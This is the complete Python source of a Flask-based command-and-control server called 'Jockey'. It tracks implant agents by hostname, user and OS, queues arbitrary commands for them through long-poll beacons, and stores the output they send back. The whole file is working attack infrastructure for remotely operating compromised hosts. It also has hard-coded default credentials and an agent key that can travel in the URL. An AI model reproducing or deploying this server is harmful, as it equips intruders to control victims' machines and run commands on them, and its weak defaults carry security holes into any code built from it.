"""Jockey C2 server — Flask + SQLite."""
import os
import time
import uuid
import sqlite3
import secrets
import threading
from functools import wraps
from flask import Flask, request, jsonify, render_template

DB_PATH       = os.environ.get("C2_DB",        "c2.db")
AGENT_KEY     = os.environ.get("C2_AGENT_KEY", "changeme-agent-key")
OPERATOR_USER = os.environ.get("C2_USER",      "admin")
OPERATOR_PASS = os.environ.get("C2_PASS",      "admin")
LISTEN_HOST   = os.environ.get("C2_HOST",      "0.0.0.0")
LISTEN_PORT   = int(os.environ.get("C2_PORT",  "8080"))
BEACON_WAIT   = int(os.environ.get("C2_BEACON", "25"))

app = Flask(__name__, template_folder="templates")

# ------------------------------------------------------------
# database
# ------------------------------------------------------------
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with db() as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            user TEXT,
            os TEXT,
            arch TEXT,
            pid INTEGER,
            first_seen INTEGER,
            last_seen INTEGER
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            cmd TEXT,
            created INTEGER,
            dispatched INTEGER DEFAULT 0,
            result TEXT,
            result_at INTEGER
        );
        """)

# ------------------------------------------------------------
# auth
# ------------------------------------------------------------
SESSIONS = {}
SESSION_LOCK = threading.Lock()

def check_operator(f):
    @wraps(f)
    def wrapper(*a, **kw):
        tok = request.cookies.get("session")
        with SESSION_LOCK:
            if not tok or tok not in SESSIONS:
                return jsonify({"error": "unauthorized"}), 401
        return f(*a, **kw)
    return wrapper

def check_agent(f):
    @wraps(f)
    def wrapper(*a, **kw):
        key = request.headers.get("X-Agent-Key") or request.args.get("key")
        if key != AGENT_KEY:
            return jsonify({"error": "bad key"}), 403
        return f(*a, **kw)
    return wrapper

# ------------------------------------------------------------
# beacon wakeup
# ------------------------------------------------------------
BEACON_EVENTS = {}
BEACON_LOCK   = threading.Lock()

def signal_agent(agent_id):
    with BEACON_LOCK:
        ev = BEACON_EVENTS.get(agent_id)
    if ev:
        ev.set()

# ------------------------------------------------------------
# operator API
# ------------------------------------------------------------
@app.route("/api/login", methods=["POST"])
def api_login():
    d = request.get_json() or {}
    if d.get("user") == OPERATOR_USER and d.get("pass") == OPERATOR_PASS:
        tok = secrets.token_hex(16)
        with SESSION_LOCK:
            SESSIONS[tok] = {"user": OPERATOR_USER, "created": time.time()}
        resp = jsonify({"ok": True})
        resp.set_cookie("session", tok, httponly=True, samesite="Lax")
        return resp
    return jsonify({"error": "bad creds"}), 401

@app.route("/api/logout", methods=["POST"])
def api_logout():
    tok = request.cookies.get("session")
    with SESSION_LOCK:
        SESSIONS.pop(tok, None)
    resp = jsonify({"ok": True})
    resp.delete_cookie("session")
    return resp

@app.route("/api/agents")
@check_operator
def api_agents():
    with db() as conn:
        rows = conn.execute(
            "SELECT * FROM agents ORDER BY last_seen DESC"
        ).fetchall()
    now = int(time.time())
    out = []
    for r in rows:
        d = dict(r)
        d["online"] = (now - (d["last_seen"] or 0)) < 60
        out.append(d)
    return jsonify(out)

@app.route("/api/agents/<aid>/command", methods=["POST"])
@check_operator
def api_command(aid):
    d = request.get_json() or {}
    cmd = (d.get("cmd") or "").strip()
    if not cmd:
        return jsonify({"error": "empty command"}), 400
    with db() as conn:
        conn.execute(
            "INSERT INTO commands (agent_id, cmd, created) VALUES (?,?,?)",
            (aid, cmd, int(time.time()))
        )
    signal_agent(aid)
    return jsonify({"ok": True})

@app.route("/api/agents/<aid>/history")
@check_operator
def api_history(aid):
    with db() as conn:
        rows = conn.execute(
            "SELECT * FROM commands WHERE agent_id=? ORDER BY id ASC",
            (aid,)
        ).fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/api/agents/<aid>", methods=["DELETE"])
@check_operator
def api_delete(aid):
    with db() as conn:
        conn.execute("DELETE FROM commands WHERE agent_id=?", (aid,))
        conn.execute("DELETE FROM agents WHERE id=?", (aid,))
    return jsonify({"ok": True})

# ------------------------------------------------------------
# agent API
# ------------------------------------------------------------
@app.route("/agent/checkin", methods=["POST"])
@check_agent
def agent_checkin():
    d = request.get_json() or {}
    aid = d.get("id") or uuid.uuid4().hex[:16]
    now = int(time.time())
    with db() as conn:
        exists = conn.execute(
            "SELECT id FROM agents WHERE id=?", (aid,)
        ).fetchone()
        if exists:
            conn.execute("""
                UPDATE agents SET hostname=?, user=?, os=?, arch=?, pid=?, last_seen=?
                WHERE id=?
            """, (d.get("hostname"), d.get("user"), d.get("os"),
                  d.get("arch"), d.get("pid"), now, aid))
        else:
            conn.execute("""
                INSERT INTO agents (id, hostname, user, os, arch, pid, first_seen, last_seen)
                VALUES (?,?,?,?,?,?,?,?)
            """, (aid, d.get("hostname"), d.get("user"), d.get("os"),
                  d.get("arch"), d.get("pid"), now, now))
    return jsonify({"id": aid})

def _fetch_pending(aid):
    with db() as conn:
        row = conn.execute("""
            SELECT id, cmd FROM commands
            WHERE agent_id=? AND dispatched=0
            ORDER BY id ASC LIMIT 1
        """, (aid,)).fetchone()
    return row

def _mark_dispatched(cid):
    with db() as conn:
        conn.execute("UPDATE commands SET dispatched=1 WHERE id=?", (cid,))

@app.route("/agent/beacon/<aid>")
@check_agent
def agent_beacon(aid):
    with db() as conn:
        conn.execute("UPDATE agents SET last_seen=? WHERE id=?",
                     (int(time.time()), aid))

    row = _fetch_pending(aid)
    if row:
        _mark_dispatched(row["id"])
        return jsonify({"cmd_id": row["id"], "cmd": row["cmd"]})

    ev = threading.Event()
    with BEACON_LOCK:
        BEACON_EVENTS[aid] = ev
    ev.wait(timeout=BEACON_WAIT)
    with BEACON_LOCK:
        BEACON_EVENTS.pop(aid, None)

    row = _fetch_pending(aid)
    if row:
        _mark_dispatched(row["id"])
        return jsonify({"cmd_id": row["id"], "cmd": row["cmd"]})
    return ("", 204)

@app.route("/agent/result/<aid>", methods=["POST"])
@check_agent
def agent_result(aid):
    d = request.get_json() or {}
    cid = d.get("cmd_id")
    result = d.get("result", "")
    with db() as conn:
        conn.execute("""
            UPDATE commands SET result=?, result_at=?
            WHERE id=? AND agent_id=?
        """, (result, int(time.time()), cid, aid))
    return jsonify({"ok": True})

# ------------------------------------------------------------
# UI
# ------------------------------------------------------------
@app.route("/")
def index():
    return render_template("index.html")

def main():
    init_db()
    print(f"[c2] agent key:  {AGENT_KEY}")
    print(f"[c2] operator:   {OPERATOR_USER} / {OPERATOR_PASS}")
    print(f"[c2] listening:  http://{LISTEN_HOST}:{LISTEN_PORT}")
    app.run(host=LISTEN_HOST, port=LISTEN_PORT, threaded=True)

if __name__ == "__main__":
    main()
